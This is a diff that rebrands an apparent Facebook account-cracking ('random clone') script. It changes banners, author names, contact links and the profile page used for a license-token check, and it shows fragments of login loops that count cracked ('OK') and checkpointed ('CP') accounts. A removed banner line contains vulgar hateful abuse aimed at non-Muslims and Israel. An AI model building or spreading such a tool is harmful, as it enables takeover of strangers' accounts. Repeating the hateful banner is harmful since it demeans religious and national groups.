@@ -143,45 +143,32 @@ else:
     tag = "AM"
 logo =f"""\033[93;1m 
 
-\033[1;35m                               /$$                
- \033[1;32m                             | $$                
- \033[1;34m /$$   /$$  /$$$$$$   /$$$$$$ | $$$$$$$  /$$   /$$
-\033[1;91m| $$  | $$ |____  $$ /$$__  $$| $$__  $$| $$  | $$
-\033[1;34m| $$  | $$  /$$$$$$$| $$  \ $$| $$  \ $$| $$  | $$
-\033[1;35m| $$  | $$ /$$__  $$| $$  | $$| $$  | $$| $$  | $$
-\033[1;32m|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$  | $$|  $$$$$$$
-\033[1;35m \____  $$ \_______/ \____  $$|__/  |__/ \____  $$
-\033[1;34m /$$  | $$           /$$  \ $$           /$$  | $$
-\033[1;32m|  $$$$$$/          |  $$$$$$/          |  $$$$$$/
-\033[1;91m \______/            \______/            \______/ 
-   
-\033[1;32m            ______           __                           
-\033[1;91m           /      \         /  |                          
-\033[1;91m  ______  /$$$$$$  |______  $$ |____    ______   _______  
-\033[1;35m /      \ $$ |_ $$//      \ $$      \  /      \ /       \ 
-\033[1;34m $$$$$$  |$$   |  /$$$$$$  |$$$$$$$  | $$$$$$  |$$$$$$$  |
-\033[1;32m /    $$ |$$$$/   $$ |  $$ |$$ |  $$ | /    $$ |$$ |  $$ |
-\033[1;35m/$$$$$$$ |$$ |    $$ \__$$ |$$ |  $$ |/$$$$$$$ |$$ |  $$ |
-\033[1;91m$$    $$ |$$ |    $$    $$ |$$ |  $$ |$$    $$ |$$ |  $$ |
- \033[1;34m$$$$$$$/ $$/      $$$$$$$ |$$/   $$/  $$$$$$$/ $$/   $$/ 
- \033[1;32m                 /  \__$$ |                              
-    \033[1;34m              $$    $$/                               
-   \033[1;91m                $$$$$$/                                
-                                                                                                
-                                                                                                    
 
-                                                                                                                                                                                                                                                                                                                                                 
-\033[1;37m╔════════════════════════════════════════════╗
-\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m AYAZ AMIRI                  \033[1;31m│
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m AYAZ AMIRI FORM PAKISTAN          \033[1;31m│
+
+       
+░█████╗░██╗░░░██╗░█████╗░███████╗
+██╔══██╗╚██╗░██╔╝██╔══██╗╚════██║
+███████║░╚████╔╝░███████║░░███╔═╝
+██╔══██║░░╚██╔╝░░██╔══██║██╔══╝░░
+██║░░██║░░░██║░░░██║░░██║███████╗
+╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝
+
+░█████╗░███╗░░░███╗██╗██████╗░██╗
+██╔══██╗████╗░████║██║██╔══██╗██║
+███████║██╔████╔██║██║██████╔╝██║
+██╔══██║██║╚██╔╝██║██║██╔══██╗██║
+██║░░██║██║░╚═╝░██║██║██║░░██║██║
+╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝╚═╝                                                                                                                                                                                                                                                                                                                                                        
+\033[1;37m╔═══════════════════════════════════════════╗
+\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m ᎪᎽᎪᏃ ᎪᎷᏆᎡᏆ                  \033[1;31m│
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m ᎪᎽᎪᏃ ᎪᎷᏆᎡᏆ ҒᎡϴᎷ ᎪҒᏀᎻᎪΝᏆՏͲᎪΝ          \033[1;31m│
 \033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m git clone https://github.com/Ayazamiri2020/Khan.git    \033[1;31m│
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32mNO USE SORRY     \033[1;31m│
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m Νϴ ႮᎬՏ ՏϴᎡᎡᎽ     \033[1;31m│
 \033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                  \033[1;31m│
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m NO USE     \033[1;31m│
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m Νϴ ႮᎬՏ     \033[1;31m│
 \033[1;37m╚🅑︎🅗︎🅣︎PRAY FOR ME ANYTIME [AYAZ AMIRI]\033[1;37m🅑︎🅗︎🅣︎╝
 \033[1;91m==========================================================
-\033[31;44m  I AM FUCKER_BOY I FUCK ONLY NON MUSLIM BUT I FUCK REALLY
-ISREALL I FUCK ALL ISREALL .. 🍂\033[0;m
+\033[31;44m  ᎠϴΝͲ ᏴᎬᏞᏆᏙᎬ ᏔᏆͲᎻ ᎪΝᎽϴΝᎬ ᏴᎬᎪᏟႮՏᎬ ͲᎻᎬ ᏦᏆΝᏀ ᏆՏ ᏴᎪᏟᏦ .. 🍂\033[0;m
 \033[1;91m=========================================================="""
 
 
@@ -210,7 +197,7 @@ def my_tool_security():
     print(logo)
     print(47*"-")
     print(c, 45*"-", wit)
-    print("\t  Facebook : AYAZ AMIRI")
+    print("\t  Facebook :https://www.facebook.com/profile.php?id=100087390175288&mibextid=ZbWKwL ")
     print("\t  Fb page  : AYAZ AMIRI")
     print("\t  Github   : MAFYIA 313")
     print(c, 45*"-")
@@ -256,7 +243,7 @@ def my_tool_security():
         exit()
     else:
         f_token=token_one+token_two
-    my_server=requests.get("https://www.facebook.com/100042882302159/posts/pfbid02ZG78gghaeEdjhr1Vo6MyvoHcPZkrCZcpH3ycnoEsswzLdVF5aZ8GueSYoHZxazael/?app=fbl").text
+    my_server=requests.get(" https://www.facebook.com/profile.php?id=100087390175288&mibextid=ZbWKwL").text
     if f_token in my_server:
         xyz()
     else:
@@ -301,7 +288,7 @@ def cek_apk(session,coki):
 
 #---------------------[MAIN MENU]---------------------#
 def xyz():
-    os.system("play-audio WELCOME_TO_MAFYIA_313_RANDOM_CLONE_TOOL.mp3")
+    os.system("play-audio WELCOME_TO_AYAZ AMIRI_2020_RANDOM_CLONE_TOOL.mp3")
     os.getuid
     
     os.system("clear");print(logo)
@@ -325,7 +312,7 @@ def xyz():
         Tabii2()
         
     elif hamii in ["3","03"]:
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100008717082810");xyz()
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100087390175288&mibextid=ZbWKwL");xyz()
     elif hamii in ["4","04"]:
         os.system("xdg-open https://wa.me/+923200596325")
         xyz()    
@@ -348,13 +335,13 @@ def password():
     print("")
     passX = input(f" {RED}CHOOSE{hamii2} : ")
     if passX in ['1','01']:
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100008717082810")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100087390175288&mibextid=ZbWKwL")
         password1()
     elif passX in ['2','02']:
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100008717082810")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100087390175288&mibextid=ZbWKwL")
         password2()
     elif passX in ['3','03']:
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100008717082810")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100087390175288&mibextid=ZbWKwL")
         password5()
     else:
         xyz()
@@ -472,7 +459,7 @@ def free1(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[MAFYIA 313🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[AMIRI] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
@@ -595,7 +582,7 @@ def free2(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[MAFYIA 313🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[AMIRI] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
@@ -712,7 +699,7 @@ def free(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[MAFYIA 313🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[AMIRI] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
@@ -825,7 +812,7 @@ def m(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[MAFYIA 313🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[AMIRI] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
